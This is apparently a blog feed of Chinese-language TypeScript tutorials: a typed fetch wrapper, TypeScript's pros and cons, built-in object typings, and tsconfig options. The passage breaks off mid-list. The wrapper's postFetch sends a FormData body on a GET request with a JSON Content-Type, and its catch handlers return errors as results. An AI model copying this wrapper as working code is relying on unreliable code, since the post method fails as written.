        <content type="html"><![CDATA[<h2 id="Fetch封装"><a href="#Fetch封装" class="headerlink" title="Fetch封装"></a>Fetch封装</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">"whatwg-fetch"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// import { fetchJsonp } from 'fetch-jsonp';</span><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> fetchJsonp <span class="token keyword">from</span> <span class="token string">'fetch-jsonp'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//test1</span><span class="token comment" spellcheck="true">/** * @description: 枚举出请求数据格式类型 * @param {type} 枚举类型 * @return:  */</span><span class="token keyword">enum</span> ContentType <span class="token punctuation">{</span>    json <span class="token operator">=</span> <span class="token string">'application/json;charset=UTF-8'</span><span class="token punctuation">,</span>    form <span class="token operator">=</span> <span class="token string">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * @description: 枚举request请求的method方法 * @param {type} 枚举类型 * @return:  */</span><span class="token keyword">enum</span> HttpMethod <span class="token punctuation">{</span>    <span class="token keyword">get</span> <span class="token operator">=</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    post <span class="token operator">=</span> <span class="token string">'POST'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * @description: 声明请求头header的类型 * @param {type}  * @return:  */</span><span class="token keyword">interface</span> <span class="token class-name">IHeader</span> <span class="token punctuation">{</span>    Accept<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    <span class="token punctuation">[</span>propName<span class="token punctuation">:</span> string<span class="token punctuation">]</span><span class="token punctuation">:</span> any<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * @description: 声明fetch请求参数配置 * @param {type}  * @return:  */</span><span class="token keyword">interface</span> <span class="token class-name">IReqConfig</span> <span class="token punctuation">{</span>    method<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    credentials<span class="token operator">?</span><span class="token punctuation">:</span> string<span class="token punctuation">;</span>    headers<span class="token operator">?</span><span class="token punctuation">:</span> IHeader<span class="token punctuation">;</span>    body<span class="token operator">?</span><span class="token punctuation">:</span>any<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">IHttp</span> <span class="token punctuation">{</span>    getFetch<span class="token operator">&lt;</span>R<span class="token punctuation">,</span>P<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">,</span> params<span class="token operator">?</span><span class="token punctuation">:</span>P<span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token punctuation">:</span>RequestInit<span class="token punctuation">)</span><span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// getFetchJsonp&lt;R,P>(url: string, params?:P, options?:RequestInit): Promise&lt;R>;</span>    postFetch<span class="token operator">&lt;</span>R<span class="token punctuation">,</span>P<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">,</span> params<span class="token operator">?</span><span class="token punctuation">:</span>P<span class="token punctuation">)</span><span class="token punctuation">:</span> Promise<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">HttpRequests</span> <span class="token keyword">implements</span> <span class="token class-name">IHttp</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> handleUrl <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>params<span class="token punctuation">:</span>any<span class="token punctuation">)</span><span class="token punctuation">:</span>string <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> paramsArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>                paramsArray<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex">/\?/</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">typeof</span> params <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token operator">?</span> <span class="token punctuation">(</span>url <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">"?"</span> <span class="token operator">+</span> paramsArray<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> url<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                url <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">"&amp;"</span> <span class="token operator">+</span> paramsArray<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> url<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">async</span> getFetch<span class="token operator">&lt;</span>R<span class="token punctuation">,</span> P<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">,</span> params<span class="token operator">?</span><span class="token punctuation">:</span>P<span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token punctuation">:</span>RequestInit<span class="token punctuation">)</span><span class="token punctuation">:</span>Promise<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">{</span>        options <span class="token operator">=</span> <span class="token punctuation">{</span>            method<span class="token punctuation">:</span> HttpMethod<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">,</span>            credentials<span class="token punctuation">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> ContentType<span class="token punctuation">.</span>json            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span>        <span class="token punctuation">.</span>then<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// alert("服务器繁忙，请稍后再试！");</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span>then<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// response.code：是与服务器端约定code：200表示请求成功，非200表示请求失败，message：请求失败内容</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 非 200，错误处理</span>                <span class="token keyword">return</span> response<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> error<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">async</span> postFetch<span class="token operator">&lt;</span>R<span class="token punctuation">,</span> P<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">(</span>url<span class="token punctuation">:</span> string<span class="token punctuation">,</span> params<span class="token operator">?</span><span class="token punctuation">:</span> P<span class="token punctuation">)</span><span class="token punctuation">:</span>Promise<span class="token operator">&lt;</span>R<span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> params<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> options<span class="token punctuation">:</span> RequestInit <span class="token operator">=</span> <span class="token punctuation">{</span>            method<span class="token punctuation">:</span> HttpMethod<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">,</span>            credentials<span class="token punctuation">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> ContentType<span class="token punctuation">.</span>json            <span class="token punctuation">}</span><span class="token punctuation">,</span>            body<span class="token punctuation">:</span> formData        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> options<span class="token punctuation">)</span>        <span class="token punctuation">.</span>then<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// alert("服务器繁忙，请稍后再试；\r\nCode:" + response.status);</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span>then<span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// response.code：是与服务器端约定code：200表示请求成功，非200表示请求失败，message：请求失败内容</span>            <span class="token keyword">return</span> response<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token operator">&lt;</span>R<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// alert("当前网络不可用，请检查网络设置！");</span>            <span class="token keyword">return</span> error<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> HttpReq <span class="token keyword">from</span> <span class="token string">'./request'</span><span class="token punctuation">;</span><span class="token keyword">const</span> Http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpReq</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">:</span>string<span class="token punctuation">,</span> params<span class="token punctuation">:</span>any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Http<span class="token punctuation">.</span><span class="token function">getFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">postFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">:</span>string<span class="token punctuation">,</span> params<span class="token punctuation">:</span>any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Http<span class="token punctuation">.</span><span class="token function">postFetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
            <tag> fetch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript优缺点</title>
      <link href="2019/08/15/feature/"/>
      <url>2019/08/15/feature/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是TypeScript"><a href="#什么是TypeScript" class="headerlink" title="什么是TypeScript"></a>什么是TypeScript</h3><p><a href="http://www.typescriptlang.org/" target="_blank" rel="noopener">TypeScript</a> 是 JavaScript 的一个超集，主要提供了<strong>类型系统</strong>和<strong>对 ES6 的支持</strong>，它由 Microsoft 开发，代码<a href="https://github.com/Microsoft/TypeScript" target="_blank" rel="noopener">开源于 GitHub</a> 上。</p><p>TypeScript 是 JavaScript 的类型的超集，它可以编译成纯 JavaScript。编译出来的 JavaScript 可以运行在任何浏览器上。TypeScript 编译工具可以运行在任何服务器和任何系统上。TypeScript 是开源的。</p><h3 id="为什么选择TypeScript"><a href="#为什么选择TypeScript" class="headerlink" title="为什么选择TypeScript"></a>为什么选择TypeScript</h3><h4 id="TypeScript-增加了代码的可读性和可维护性"><a href="#TypeScript-增加了代码的可读性和可维护性" class="headerlink" title="TypeScript 增加了代码的可读性和可维护性"></a>TypeScript 增加了代码的可读性和可维护性</h4><ul><li>类型系统实际上是最好的文档，大部分的函数看看类型的定义就可以知道如何使用了</li><li>可以在编译阶段就发现大部分错误，这总比在运行时候出错好</li><li>增强了编辑器和 IDE 的功能，包括代码补全、接口提示、跳转到定义、重构等</li></ul><h4 id="TypeScript-非常包容"><a href="#TypeScript-非常包容" class="headerlink" title="TypeScript 非常包容"></a>TypeScript 非常包容</h4><ul><li>TypeScript 是 JavaScript 的超集，<code>.js</code> 文件可以直接重命名为 <code>.ts</code> 即可</li><li>即使不显式的定义类型，也能够自动做出<a href>类型推论</a></li><li>可以定义从简单到复杂的几乎一切类型</li><li>即使 TypeScript 编译报错，也可以生成 JavaScript 文件</li><li>兼容第三方库，即使第三方库不是用 TypeScript 写的，也可以编写单独的类型文件供 TypeScript 读取</li></ul><h4 id="TypeScript-拥有活跃的社区"><a href="#TypeScript-拥有活跃的社区" class="headerlink" title="TypeScript 拥有活跃的社区"></a>TypeScript 拥有活跃的社区</h4><ul><li>大部分第三方库都有提供给 TypeScript 的类型定义文件</li><li>Google 开发的 Angular2 就是使用 TypeScript 编写的</li><li>TypeScript 拥抱了 ES6 规范，也支持部分 ESNext 草案的规范</li></ul><h4 id="TypeScript-的缺点"><a href="#TypeScript-的缺点" class="headerlink" title="TypeScript 的缺点"></a>TypeScript 的缺点</h4><p>任何事物都是有两面性的，我认为 TypeScript 的弊端在于：</p><ul><li>有一定的学习成本，需要理解接口（Interfaces）、泛型（Generics）、类（Classes）、枚举类型（Enums）等前端工程师可能不是很熟悉的概念</li><li>短期可能会增加一些开发成本，毕竟要多写一些类型的定义，不过对于一个需要长期维护的项目，TypeScript 能够减少其维护成本</li><li>集成到构建流程需要一些工作量</li><li>可能和一些库结合的不是很完美</li></ul><h3 id="安装-TypeScript"><a href="#安装-TypeScript" class="headerlink" title="安装 TypeScript"></a>安装 TypeScript</h3><p>TypeScript 的命令行工具安装方法如下：</p><pre class="line-numbers language-js"><code class="language-js">npm install <span class="token operator">-</span>g typescript<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上命令会在全局环境下安装 <code>tsc</code> 命令，安装完成之后，我们就可以在任何地方执行 <code>tsc</code> 命令了。</p><pre class="line-numbers language-js"><code class="language-js">tsc <span class="token operator">-</span>v 查看版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用 TypeScript 编写 React 时，以 <code>.tsx</code> 为后缀。</p><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3><p>TypeScript 最大的优势便是增强了编辑器和 IDE 的功能，包括代码补全、接口提示、跳转到定义、重构等。</p><p>主流的编辑器都支持 TypeScript，推荐使用<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Visual Studio Code</a>。</p><p>如果vscode里面安装的TS版本和全局安装的版本不同会有冲突，代码编写时会一直报错；</p><p>Ctrl+shift+p查看VScode TypeScript版本是否相同不相同选择本地安装的TS就可以了</p>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript内置对象</title>
      <link href="2019/08/15/tsinner/"/>
      <url>2019/08/15/tsinner/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JavaScript 中有很多<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects" target="_blank" rel="noopener">内置对象</a>，它们可以直接在 TypeScript 中当做定义好了的类型。</p><p>内置对象是指根据标准在全局作用域（Global）上存在的对象。这里的标准是指 ECMAScript 和其他环境（比如 DOM）的标准。</p><h2 id="ECMAScript-的内置对象"><a href="#ECMAScript-的内置对象" class="headerlink" title="ECMAScript 的内置对象"></a>ECMAScript 的内置对象</h2><p>ECMAScript 标准提供的内置对象有：</p><p><code>Boolean</code>、<code>Error</code>、<code>Date</code>、<code>RegExp</code> 等。</p><p>我们可以在 TypeScript 中将变量定义为这些类型：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> B<span class="token punctuation">:</span> Boolean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Boolean</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Boolean {true}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而他们的定义文件，则在 <a href="https://github.com/Microsoft/TypeScript/tree/master/src/lib" target="_blank" rel="noopener">TypeScript 核心库的定义文件</a>中。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Boolean</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/** Returns the primitive value of the specified object. */</span>    <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">BooleanConstructor</span> <span class="token punctuation">{</span>    <span class="token keyword">new</span><span class="token punctuation">(</span>value<span class="token operator">?</span><span class="token punctuation">:</span> any<span class="token punctuation">)</span><span class="token punctuation">:</span> Boolean<span class="token punctuation">;</span>    <span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>value<span class="token operator">?</span><span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> boolean<span class="token punctuation">;</span>    readonly prototype<span class="token punctuation">:</span> Boolean<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DOM-和-BOM-的内置对象"><a href="#DOM-和-BOM-的内置对象" class="headerlink" title="DOM 和 BOM 的内置对象"></a>DOM 和 BOM 的内置对象</h2><p>DOM 和 BOM 提供的内置对象有：</p><p><code>Document</code>、<code>HTMLElement</code>、<code>Event</code>、<code>NodeList</code> 等。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> body<span class="token punctuation">:</span> HTMLElement <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它们的定义文件同样在 <a href="https://github.com/Microsoft/TypeScript/tree/master/src/lib" target="_blank" rel="noopener">TypeScript 核心库的定义文件</a>中。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">HTMLElement</span> <span class="token keyword">extends</span> <span class="token class-name">Element</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="TypeScript-核心库的定义文件"><a href="#TypeScript-核心库的定义文件" class="headerlink" title="TypeScript 核心库的定义文件"></a>TypeScript 核心库的定义文件</h2><p><a href="https://github.com/Microsoft/TypeScript/tree/master/src/lib" target="_blank" rel="noopener">TypeScript 核心库的定义文件</a>中定义了所有浏览器环境需要用到的类型，并且是预置在 TypeScript 中的。</p><p>当你在使用一些常用的方法的时候，TypeScript 实际上已经帮你做了很多类型判断的工作了，比如：</p><pre class="line-numbers language-js"><code class="language-js">Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Argument of type '"2"' is not assignable to parameter of type 'number'.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定义如下：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">interface</span> <span class="token class-name">Math</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Returns the value of a base expression taken to a specified power.     * @param x The base value of the expression.     * @param y The exponent value of the expression.     */</span>    <span class="token function">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> number<span class="token punctuation">,</span> y<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span> number<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript tsconfig.json</title>
      <link href="2019/08/12/tsconfig/"/>
      <url>2019/08/12/tsconfig/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>如果一个目录下存在一个<code>tsconfig.json</code>文件，那么它意味着这个目录是TypeScript项目的根目录。<code>tsconfig.json</code>文件中指定了用来编译这个项目的根文件和编译选项。 </p><p>开始使用 <code>tsconfig.json</code> 是一件比较容易的事，你仅仅需要写下：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如在你项目的根目录下创建一个空 json 文件。通过此种方式，TypeScript 将会把此目录下（和子目录）的所有 <code>.ts</code> 文件做为编译上下文的一部分，它还会包含一部分默认的编译选项。</p><h2 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h2><ul><li>你可以通过 <code>compilerOptions</code> 来定制你的编译选项：</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span>  <span class="token string">"compilerOptions"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 基本选项 */</span>    <span class="token string">"target"</span><span class="token punctuation">:</span> <span class="token string">"es5"</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 指定 ECMAScript 目标版本: 'ES3' (default), 'ES5', 'ES2015', 'ES2016', 'ES2017', or 'ESNEXT'</span>    <span class="token string">"module"</span><span class="token punctuation">:</span> <span class="token string">"commonjs"</span><span class="token punctuation">,</span>                  <span class="token comment" spellcheck="true">// 指定使用模块: 'commonjs', 'amd', 'system', 'umd' or 'es2015'</span>    <span class="token string">"lib"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                             <span class="token comment" spellcheck="true">// 指定要包含在编译中的库文件</span>    <span class="token string">"allowJs"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 允许编译 javascript 文件</span>    <span class="token string">"checkJs"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 报告 javascript 文件中的错误</span>    <span class="token string">"jsx"</span><span class="token punctuation">:</span> <span class="token string">"preserve"</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 指定 jsx 代码的生成: 'preserve', 'react-native', or 'react'</span>    <span class="token string">"declaration"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true">// 生成相应的 '.d.ts' 文件</span>    <span class="token string">"sourceMap"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                     <span class="token comment" spellcheck="true">// 生成相应的 '.map' 文件</span>    <span class="token string">"outFile"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 将输出文件合并为一个文件</span>    <span class="token string">"outDir"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                        <span class="token comment" spellcheck="true">// 指定输出目录</span>    <span class="token string">"rootDir"</span><span class="token punctuation">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                       <span class="token comment" spellcheck="true">// 用来控制输出目录结构 --outDir.</span>    <span class="token string">"removeComments"</span><span class="token punctuation">:</span> <span class="token 